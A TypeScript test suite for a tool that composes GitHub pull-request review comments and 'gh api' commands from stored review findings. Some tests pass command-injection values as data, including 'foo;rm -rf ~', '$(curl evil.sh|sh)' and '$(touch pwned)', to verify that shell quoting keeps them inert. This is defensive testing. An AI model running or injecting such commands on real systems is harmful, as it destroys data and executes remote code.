import { expect, test, describe } from "bun:test";
import {
  createStore,
  upsertProject,
  createTicket,
  createReviewFinding,
  setFindingStatus,
} from "@standup/store";
import type { Launch, ReviewFinding, Ticket } from "@standup/shared";
import {
  composeReviewComments,
  reviewCommentsForTicket,
  reviewCommentsPrRefFromLaunch,
  type ReviewCommentsPrRef,
} from "./review-comments.js";

function finding(overrides: Partial<ReviewFinding> = {}): ReviewFinding {
  const now = new Date();
  return {
    id: "F1",
    ticketId: "T1",
    severity: "high",
    title: "Unbounded loop",
    body: "The retry loop has no ceiling.",
    file: "src/w.ts",
    line: 42,
    status: "open",
    evidence: { checks: [], screenshots: [] },
    createdAt: now,
    updatedAt: now,
    ...overrides,
  };
}

function ref(overrides: Partial<ReviewCommentsPrRef> = {}): ReviewCommentsPrRef {
  return { number: 7, repo: "acme/widget", branch: "standup/fix-abc", worktreePath: "/tmp/wt", ...overrides };
}

describe("composeReviewComments (dry-run, pure)", () => {
  test("maps only High/critical findings to inline {path,line,body}; low/medium excluded", () => {
    const res = composeReviewComments(
      [
        finding({ id: "F1", severity: "critical", title: "Data loss", file: "src/db.ts", line: 10 }),
        finding({ id: "F2", severity: "high", title: "Unbounded loop", file: "src/w.ts", line: 42 }),
        finding({ id: "F3", severity: "medium", title: "Nit", file: "src/x.ts", line: 5 }),
        finding({ id: "F4", severity: "low", title: "Typo", file: "src/y.ts", line: 1 }),
      ],
      ref()
    );
    expect(res.comments).toHaveLength(2);
    // Correct path/line preserved from the finding.
    const paths = res.comments.map((c) => `${c.path}:${c.line}`).sort();
    expect(paths).toEqual(["src/db.ts:10", "src/w.ts:42"]);
    // Body carries the severity-tagged title and the finding body.
    const loop = res.comments.find((c) => c.path === "src/w.ts")!;
    expect(loop.body).toContain("[high] Unbounded loop");
    expect(loop.body).toContain("The retry loop has no ceiling.");
    // Low/medium never render — not inline, not in the body.
    expect(JSON.stringify(res.comments)).not.toContain("Nit");
    expect(JSON.stringify(res.comments)).not.toContain("Typo");
    expect(res.body).not.toContain("Nit");
    expect(res.body).not.toContain("Typo");
  });

  test("superseded/dismissed High findings are excluded (only still-active post)", () => {
    const res = composeReviewComments(
      [
        finding({ id: "F1", title: "Live open", status: "open" }),
        finding({ id: "F2", title: "Fixer in flight", status: "dispatched", file: "src/a.ts", line: 3 }),
        finding({ id: "F3", title: "Replaced", status: "superseded", file: "src/b.ts", line: 4 }),
        finding({ id: "F4", title: "Waved off", status: "dismissed", file: "src/c.ts", line: 5 }),
      ],
      ref()
    );
    const bodies = res.comments.map((c) => c.body).join("\n");
    expect(bodies).toContain("Live open");
    expect(bodies).toContain("Fixer in flight");
    expect(bodies).not.toContain("Replaced");
    expect(bodies).not.toContain("Waved off");
    expect(res.comments).toHaveLength(2);
  });

  test("a High finding with no location rides the review body + a warning, never inline", () => {
    const res = composeReviewComments(
      [
        finding({ id: "F1", title: "Anchored", file: "src/w.ts", line: 42 }),
        finding({ id: "F2", title: "No location", file: undefined, line: undefined }),
        finding({ id: "F3", title: "File but no line", file: "src/z.ts", line: undefined }),
      ],
      ref()
    );
    // Only the fully-anchored finding is an inline comment.
    expect(res.comments).toHaveLength(1);
    expect(res.comments[0].path).toBe("src/w.ts");
    // The unanchored two are summarized into the review body...
    expect(res.body).toContain("No location");
    expect(res.body).toContain("File but no line");
    // ...and a warning flags that they weren't posted inline.
    expect(res.warnings).toHaveLength(1);
    expect(res.warnings[0]).toContain("no file/line");
    // Body counts all three as blocking findings.
    expect(res.body).toContain("3 blocking findings");
  });

  test("event defaults to REQUEST_CHANGES when a blocking finding is present", () => {
    const res = composeReviewComments([finding()], ref());
    expect(res.event).toBe("REQUEST_CHANGES");
    expect(res.reviewRequest.event).toBe("REQUEST_CHANGES");
  });

  test("event defaults to COMMENT when nothing blocking survives the filter", () => {
    const res = composeReviewComments(
      [finding({ severity: "medium" }), finding({ severity: "low" })],
      ref()
    );
    expect(res.event).toBe("COMMENT");
    expect(res.comments).toHaveLength(0);
    expect(res.body).toContain("no blocking findings");
  });

  test("an explicit opts.event overrides the default", () => {
    const res = composeReviewComments([finding()], ref(), { event: "COMMENT" });
    expect(res.event).toBe("COMMENT");
  });

  test("composes a `gh api … /reviews --input` command referencing the minted PR", () => {
    const res = composeReviewComments([finding()], ref({ number: 42, repo: "acme/widget" }));
    const api = res.commands[res.commands.length - 1];
    // The reviews-API path is shell-quoted as a single word (defense against a
    // hostile owner/repo slug); a legitimate slug reads back verbatim.
    expect(api).toBe(
      "gh api --method POST '/repos/acme/widget/pulls/42/reviews' --input '/tmp/wt/.standup-pr-review.json'"
    );
    // No placeholders when the PR ref is fully known.
    expect(res.placeholders).toEqual([]);
  });

  test("leaves <pr-number>/<owner/repo> placeholders when the PR ref is unknown pre-mint", () => {
    const res = composeReviewComments([finding()], { branch: "standup/fix-abc", worktreePath: "/tmp/wt" });
    const api = res.commands[res.commands.length - 1];
    expect(api).toContain("/repos/<owner/repo>/pulls/<pr-number>/reviews");
    expect(res.placeholders).toHaveLength(2);
    expect(res.placeholders.join(" ")).toContain("<pr-number>");
    expect(res.placeholders.join(" ")).toContain("<owner/repo>");
    expect(res.prNumber).toBeUndefined();
    expect(res.repo).toBeUndefined();
  });

  test("a hostile owner/repo slug is shell-quoted inert in the composed command", () => {
    const res = composeReviewComments([finding()], ref({ number: 42, repo: "foo;rm -rf ~" }));
    const api = res.commands[res.commands.length - 1];
    // The whole path rides one single-quoted word, so the `;rm -rf ~` cannot run
    // when the command is pasted — it is a literal argument to `gh api`.
    expect(api).toContain("'/repos/foo;rm -rf ~/pulls/42/reviews'");
    expect(api).not.toContain("POST /repos/foo;rm");
  });

  test("writes the payload file (JSON of the reviewRequest) before the gh api reads it", () => {
    const res = composeReviewComments([finding()], ref());
    expect(res.payloadFile.path).toBe("/tmp/wt/.standup-pr-review.json");
    // The file contents are exactly the reviews-API request payload.
    expect(res.payloadFile.contents).toBe(JSON.stringify(res.reviewRequest, null, 2));
    // The write precedes the gh api that consumes it, and is runnable verbatim.
    const write = res.commands.find((c) => c.startsWith("cat > '/tmp/wt/.standup-pr-review.json'"))!;
    expect(write).toBeDefined();
    expect(write).toContain("<<'STANDUP_PR_REVIEW'");
    expect(write).toContain(res.payloadFile.contents);
    const writeIdx = res.commands.indexOf(write);
    const apiIdx = res.commands.findIndex((c) => c.startsWith("gh api"));
    expect(writeIdx).toBeLessThan(apiIdx);
  });

  test("a hostile finding body cannot run shell code (quoted heredoc keeps it inert)", () => {
    const res = composeReviewComments(
      [finding({ body: "$(curl evil.sh|sh) `id` $HOME" })],
      ref()
    );
    const write = res.commands.find((c) => c.startsWith("cat >"))!;
    // A quoted heredoc delimiter suppresses every expansion — the body is literal.
    expect(write).toContain("<<'STANDUP_PR_REVIEW'");
    expect(write).toContain("$(curl evil.sh|sh) `id` $HOME");
  });

  test("a worktree path with a space is shell-quoted so the write + gh api stay runnable", () => {
    // The worktree root is user/UI/env-configurable — a real macOS repo can sit
    // under `/Users/foo/My Code/widget`. Unquoted, `cat > …/My Code/…` is an
    // ambiguous redirect and `--input …/My Code/…` splits into two args.
    const res = composeReviewComments(
      [finding()],
      ref({ number: 42, repo: "acme/widget", worktreePath: "/Users/foo/My Code/widget" })
    );
    // The returned filesystem path stays raw (no shell quoting) — it's the actual path.
    expect(res.payloadFile.path).toBe("/Users/foo/My Code/widget/.standup-pr-review.json");
    // Both composed commands carry the path as one single-quoted word.
    const write = res.commands.find((c) => c.startsWith("cat >"))!;
    expect(write).toContain("cat > '/Users/foo/My Code/widget/.standup-pr-review.json'");
    const api = res.commands[res.commands.length - 1];
    expect(api).toContain("--input '/Users/foo/My Code/widget/.standup-pr-review.json'");
    // The space never leaks as a bare word-split (no unquoted `My` fragment).
    expect(api).not.toContain("--input /Users/foo/My Code");
    expect(write).not.toContain("cat > /Users/foo/My Code");
  });

  test("a worktree path with a shell metacharacter cannot run code on paste", () => {
    const res = composeReviewComments(
      [finding()],
      ref({ number: 42, repo: "acme/widget", worktreePath: "/tmp/$(touch pwned)" })
    );
    const write = res.commands.find((c) => c.startsWith("cat >"))!;
    const api = res.commands[res.commands.length - 1];
    // Single quotes keep `$(touch pwned)` inert — a literal path segment, not a command.
    expect(write).toContain("cat > '/tmp/$(touch pwned)/.standup-pr-review.json'");
    expect(api).toContain("--input '/tmp/$(touch pwned)/.standup-pr-review.json'");
  });

  test("live post is refused in this build (throws before any gh/network)", () => {
    expect(() => composeReviewComments([finding()], ref(), { live: true })).toThrow(
      /live post is not enabled/i
    );
  });
});

describe("reviewCommentsForTicket (store-backed, dry-run)", () => {
  function ticket(db: ReturnType<typeof createStore>["db"]): Ticket {
    upsertProject(db, { id: "p", name: "p", branch: "main", repos: ["~/code/p"] });
    return createTicket(db, {
      projectId: "p",
      lens: "bugs",
      title: "Fix the widget",
      body: "",
      severity: "high",
    });
  }

  test("reads the ticket's findings, posts only the High/critical ones, stamps the ticketId", () => {
    const store = createStore(":memory:");
    const t = ticket(store.db);
    createReviewFinding(store.db, {
      ticketId: t.id, severity: "critical", title: "Data loss", file: "src/db.ts", line: 10,
    });
    createReviewFinding(store.db, {
      ticketId: t.id, severity: "high", title: "Unbounded loop", file: "src/w.ts", line: 42,
    });
    createReviewFinding(store.db, {
      ticketId: t.id, severity: "medium", title: "Nit", file: "src/x.ts", line: 5,
    });

    const res = reviewCommentsForTicket(store.db, {
      ticket: t,
      ref: { number: 7, repo: "acme/widget", branch: "standup/fix-abc", worktreePath: "/tmp/wt" },
    });

    expect(res.ticketId).toBe(t.id);
    expect(res.comments).toHaveLength(2);
    const paths = res.comments.map((c) => c.path).sort();
    expect(paths).toEqual(["src/db.ts", "src/w.ts"]);
    // The medium finding is recorded but never posted.
    expect(JSON.stringify(res.comments)).not.toContain("Nit");
    expect(res.live).toBe(false);
    store.close();
  });

  test("a dismissed High finding drops off; a still-open one posts", () => {
    const store = createStore(":memory:");
    const t = ticket(store.db);
    const f1 = createReviewFinding(store.db, {
      ticketId: t.id, severity: "high", title: "Waved off", file: "src/a.ts", line: 1,
    });
    setFindingStatus(store.db, f1.id, "dismissed");
    createReviewFinding(store.db, {
      ticketId: t.id, severity: "high", title: "Live open", file: "src/b.ts", line: 2,
    });

    const res = reviewCommentsForTicket(store.db, {
      ticket: t,
      ref: { number: 7, repo: "acme/widget" },
    });
    expect(res.comments).toHaveLength(1);
    expect(res.comments[0].path).toBe("src/b.ts");
    expect(res.comments[0].body).toContain("Live open");
    store.close();
  });
});

describe("reviewCommentsPrRefFromLaunch (minted-PR linkage)", () => {
  function launch(overrides: Partial<Launch> = {}): Launch {
    return {
      id: "L1",
      kind: "worktree",
      projectId: "p",
      task: "fix",
      worktreePath: "/tmp/wt",
      branch: "standup/fix-abc",
      status: "running",
      keepAlive: false,
      createdAt: new Date(),
      ...overrides,
    };
  }

  test("carries the launch's real head branch + worktree (the PR the Publisher mints)", () => {
    const ref = reviewCommentsPrRefFromLaunch(launch());
    expect(ref.branch).toBe("standup/fix-abc");
    expect(ref.worktreePath).toBe("/tmp/wt");
    // The PR number and owner/repo slug are unresolved pre-mint → composer uses placeholders.
    expect(ref.number).toBeUndefined();
    expect(ref.repo).toBeUndefined();
  });

  test("drops a parenthetical launcher marker — only a real branch is a PR head", () => {
    const ref = reviewCommentsPrRefFromLaunch(launch({ branch: "(scratch — no repo)" }));
    expect(ref.branch).toBeUndefined();
    // The worktree still rides through so the payload file lands beside the change.
    expect(ref.worktreePath).toBe("/tmp/wt");
  });

  test("a null launch leaves branch + worktree unset", () => {
    const ref = reviewCommentsPrRefFromLaunch(null);
    expect(ref.branch).toBeUndefined();
    expect(ref.worktreePath).toBeUndefined();
  });
});
